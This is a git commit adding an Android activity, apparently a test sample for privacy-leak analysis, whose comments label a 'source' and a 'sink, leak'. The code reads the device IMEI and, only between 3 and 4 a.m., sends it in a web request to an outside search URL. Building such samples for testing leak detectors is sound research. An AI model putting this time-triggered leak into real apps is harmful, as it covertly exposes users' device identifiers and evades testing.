92f0bced72ee12e5c7dbd88b0967ee482d86bc7b
Hao Fu <jamesfuhao@gmail.com>
2016-06-30 17:40:42 -0700

    Time1

---
+++ Time1/app/src/main/java/edu/ucdavis/time1/MainActivity.java
@@ -0,0 +1,81 @@
+package edu.ucdavis.time1;
+
+import android.content.Context;
+import android.support.v7.app.AppCompatActivity;
+import android.os.Bundle;
+import android.telephony.TelephonyManager;
+import android.util.Log;
+
+import java.io.BufferedReader;
+import java.io.IOException;
+import java.io.InputStream;
+import java.io.InputStreamReader;
+import java.net.HttpURLConnection;
+import java.net.URL;
+import java.util.Calendar;
+
+public class MainActivity extends AppCompatActivity {
+
+    @Override
+    protected void onCreate(Bundle savedInstanceState) {
+        super.onCreate(savedInstanceState);
+        setContentView(R.layout.activity_main);
+
+        TelephonyManager telephonyManager = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
+        String imei = telephonyManager.getDeviceId(); //source
+
+        Calendar calendar = Calendar.getInstance();
+        int hours = calendar.get(Calendar.HOUR_OF_DAY);
+
+        if (hours > 2 && hours < 5) {
+            Log.d(getClass().getSimpleName(), "Hours: " + hours);
+            Thread connectionThread = new Thread(new ConnectionThread(imei));
+            connectionThread.start();
+        }
+    }
+
+    private class ConnectionThread implements Runnable {
+        String data = "";
+
+        public ConnectionThread (String data) {
+            this.data = data;
+        }
+
+        public void run() {
+            try {
+                connect(data);
+            } catch (Exception e) {
+                e.printStackTrace();
+            }
+        }
+
+        private void connect(String data) throws IOException {
+            String URL = "http://www.google.de/search?q=";
+            URL = URL.concat(data);
+            java.net.URL url = new URL(URL);
+            HttpURLConnection conn = (HttpURLConnection) url.openConnection(); //sink, leak
+            conn.setRequestMethod("GET");
+            conn.setDoInput(true);
+            // Starts the query
+            conn.connect();
+            Log.d(getClass().getSimpleName(), URL);
+
+            InputStream is = conn.getInputStream();
+            if (is == null) {
+                return;
+            }
+            StringBuilder sb = new StringBuilder();
+            BufferedReader br = new BufferedReader(new InputStreamReader(is));
+            String line;
+            try {
+                while ((line = br.readLine()) != null) {
+                    sb.append(line);
+                }
+            } finally {
+                br.close();
+                is.close();
+            }
+            Log.d(getClass().getSimpleName(), sb.toString());
+        }
+    }
+}
